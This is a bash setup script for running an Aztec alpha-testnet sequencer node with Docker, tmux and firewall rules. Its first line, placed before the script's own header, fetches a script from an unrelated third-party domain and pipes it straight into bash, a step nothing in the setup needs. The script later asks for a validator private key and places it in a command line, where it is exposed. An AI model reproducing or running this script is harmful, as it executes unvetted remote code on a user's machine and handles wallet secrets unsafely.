#!/bin/bash

curl -s https://data.zamzasalim.xyz/file/uploads/asclogo.sh | bash
sleep 5

# setup_aztec.sh
# Script to set up Aztec node with dependencies, Docker, firewall configuration,
# and retrieve block number and sync proof

# Exit on any error
set -e

# Function to check if a command exists
command_exists() {
    command -v "$1" >/dev/null 2>&1
}

# Prompt for required inputs
echo "Please provide the following details:"
read -p "Enter ETH Sepolia RPC URL: " RPC_URL
read -p "Enter ETH Beacon Sepolia RPC URL: " BEACON_URL
read -p "Enter Sequencer Private Key (0x...): " VALIDATOR_PRIVATE_KEY
read -p "Enter Sequencer Address (0x...): " COINBASE_ADDRESS
read -p "Enter IP VPS: " P2P_IP

# Validate inputs
if [ -z "$RPC_URL" ] || [ -z "$BEACON_URL" ] || [ -z "$VALIDATOR_PRIVATE_KEY" ] || [ -z "$COINBASE_ADDRESS" ] || [ -z "$P2P_IP" ]; then
    echo "Error: All inputs are required."
    exit 1
fi

echo "Starting Aztec node setup..."

# Step 1: Update packages
echo "Updating system packages..."
sudo apt-get update && sudo apt-get upgrade -y

# Step 2: Install required packages
echo "Installing required packages..."
sudo apt install -y curl iptables build-essential git wget lz4 jq make gcc nano automake autoconf tmux htop nvme-cli libgbm1 pkg-config libssl-dev libleveldb-dev tar clang bsdmainutils ncdu unzip libleveldb-dev

# Step 3: Install Docker (skip if already installed)
if ! command_exists docker; then
    echo "Installing Docker..."
    sudo apt update -y && sudo apt upgrade -y

    # Remove conflicting packages
    for pkg in docker.io docker-doc docker-compose podman-docker containerd runc; do
        sudo apt-get remove -y $pkg || true
    done

    # Add Docker's official GPG key
    sudo apt-get update
    sudo apt-get install -y ca-certificates curl gnupg
    sudo install -m 0755 -d /etc/apt/keyrings
    curl -fsSL https://download.docker.com/linux/ubuntu/gpg | sudo gpg --dearmor -o /etc/apt/keyrings/docker.gpg
    sudo chmod a+r /etc/apt/keyrings/docker.gpg

    # Set up the Docker repository
    echo \
      "deb [arch=$(dpkg --print-architecture) signed-by=/etc/apt/keyrings/docker.gpg] https://download.docker.com/linux/ubuntu \
      $(source /etc/os-release && echo "$VERSION_CODENAME") stable" | \
      sudo tee /etc/apt/sources.list.d/docker.list > /dev/null

    # Install Docker
    sudo apt update -y && sudo apt upgrade -y
    sudo apt-get install -y docker-ce docker-ce-cli containerd.io docker-buildx-plugin docker-compose-plugin

    # Test Docker
    echo "Testing Docker installation..."
    sudo docker run hello-world

    # Enable and restart Docker service
    sudo systemctl enable docker
    sudo systemctl restart docker
else
    echo "Docker is already installed, skipping..."
fi

# Step 4: Install Aztec Tools
echo "Installing Aztec Tools..."
bash -i <(curl -s https://install.aztec.network)

# Verify Aztec installation
echo "Verifying Aztec installation..."
if command_exists aztec; then
    echo "Aztec installed successfully."
else
    echo "Error: Aztec installation failed."
    exit 1
fi

# Update Aztec
echo "Updating Aztec to alpha-testnet..."
aztec-up alpha-testnet

# Step 5: Configure Firewall
echo "Configuring firewall..."
sudo ufw allow 22
sudo ufw allow ssh
sudo ufw allow 40400
sudo ufw allow 8080
sudo ufw enable
echo "y" | sudo ufw enable  # Auto-confirm enabling firewall

# Step 6: Start Tmux session
echo "Starting tmux session..."
if ! command_exists tmux; then
    echo "Installing tmux..."
    sudo apt install -y tmux
fi
tmux new-session -d -s aztec

# Step 7: Run Sequencer Node
echo "Starting Aztec Sequencer Node in tmux session..."
tmux send-keys -t aztec "aztec start --node --archiver --sequencer \
  --network alpha-testnet \
  --l1-rpc-urls $RPC_URL \
  --l1-consensus-host-urls $BEACON_URL \
  --sequencer.validatorPrivateKey $VALIDATOR_PRIVATE_KEY \
  --sequencer.coinbase $COINBASE_ADDRESS \
  --p2p.p2pIp $P2P_IP \
  --p2p.maxTxPoolSize 1000000000" C-m

# Step 8: Wait for node to be ready and retrieve block number and proof
echo "Waiting for the node to start (this may take a few minutes)..."
sleep 60  # Adjust sleep time as needed based on node startup time

# Function to check if node is reachable
check_node() {
    curl -s -X POST -H 'Content-Type: application/json' \
        -d '{"jsonrpc":"2.0","method":"node_getL2Tips","params":[],"id":67}' \
        http://localhost:8080 >/dev/null 2>&1
    return $?
}

# Wait for node to be reachable (up to 5 minutes)
MAX_WAIT=300
WAIT_INTERVAL=10
ELAPSED=0

while [ $ELAPSED -lt $MAX_WAIT ]; do
    if check_node; then
        echo "Node is reachable!"
        break
    fi
    echo "Waiting for node to become reachable... ($ELAPSED/$MAX_WAIT seconds)"
    sleep $WAIT_INTERVAL
    ELAPSED=$((ELAPSED + WAIT_INTERVAL))
done

if [ $ELAPSED -ge $MAX_WAIT ]; then
    echo "Error: Node is not reachable after $MAX_WAIT seconds. Please check the node logs in the 'aztec' tmux session."
    echo "To attach, run: tmux attach -t aztec"
    exit 1
fi

# Get the latest proven block number
echo "Retrieving the latest proven block number..."
BLOCK_NUMBER=$(curl -s -X POST -H 'Content-Type: application/json' \
    -d '{"jsonrpc":"2.0","method":"node_getL2Tips","params":[],"id":67}' \
    http://localhost:8080 | jq -r '.result.proven.number')

if [ -z "$BLOCK_NUMBER" ] || [ "$BLOCK_NUMBER" = "null" ]; then
    echo "Error: Failed to retrieve block number. Check node status."
    echo "To view logs, run: tmux attach -t aztec"
    exit 1
fi

echo "Latest Proven Block Number: $BLOCK_NUMBER"

# Generate sync proof for the block number
echo "Generating sync proof for block number $BLOCK_NUMBER..."
SYNC_PROOF=$(curl -s -X POST -H 'Content-Type: application/json' \
    -d "{\"jsonrpc\":\"2.0\",\"method\":\"node_getArchiveSiblingPath\",\"params\":[\"$BLOCK_NUMBER\",\"$BLOCK_NUMBER\"],\"id\":67}" \
    http://localhost:8080 | jq -r '.result')

if [ -z "$SYNC_PROOF" ] || [ "$SYNC_PROOF" = "null" ]; then
    echo "Error: Failed to generate sync proof. Check node status."
    echo "To view logs, run: tmux attach -t aztec"
    exit 1
fi

echo "Sync Proof (base64): $SYNC_PROOF"

# Save output to a file for reference
OUTPUT_FILE="aztec_node_output.txt"
echo "Saving block number and sync proof to $OUTPUT_FILE..."
cat << EOF > $OUTPUT_FILE
Aztec Node Setup Output
----------------------
Timestamp: $(date)
Latest Proven Block Number: $BLOCK_NUMBER
Sync Proof (base64): $SYNC_PROOF
----------------------
To attach to the node session, run: tmux attach -t aztec
To detach from the session, press: Ctrl+b, then d
EOF

echo "Setup complete! Aztec Sequencer Node is running in tmux session 'aztec'."
echo "Block number and sync proof have been saved to $OUTPUT_FILE."
echo "To attach to the tmux session, run: tmux attach -t aztec"
echo "To detach from the tmux session, press: Ctrl+b, then d"
